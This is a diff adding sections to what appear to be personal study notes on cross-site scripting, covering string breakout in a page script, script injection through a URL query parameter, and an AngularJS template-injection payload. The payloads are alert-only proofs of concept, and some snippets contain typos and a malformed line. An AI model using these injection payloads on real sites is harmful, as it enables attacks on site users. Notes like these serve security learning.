@@ -36,3 +36,45 @@ or with less tags:
 ```
 
 ---
+
+## Injecting JavaScript Directly in a Page Script
+
+Example: A search term is used in a JS function
+
+```
+var seartchTerms = 'test';
+document.write('<img src="/resources/images"tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+```
+
+JS code can be injected into the page via the textarea search:
+
+```
+';alert(22);//
+```
+
+single quotes closed and comments added at the end
+
+---
+
+
+## Discovering XSS in a Drop-down menu
+
+Example: modyfing URL query params for an async search function
+
+```
+.net/productId=3&storeId=Milanaaa<script>alert(22)</script>
+```
+
+---
+
+## Discovering XSS in AngularyJS Application
+
+Gathering information about technology used in Wappalyzer tool
+- Find out AngularJS framework is uded
+- Google for: angualar js xss cheatsheet
+- Found that there is a way to run JS in AngularJS: `{{constructor.constructor('alert(1)')()}}`
+- JS code is injected
+
+---
+
+
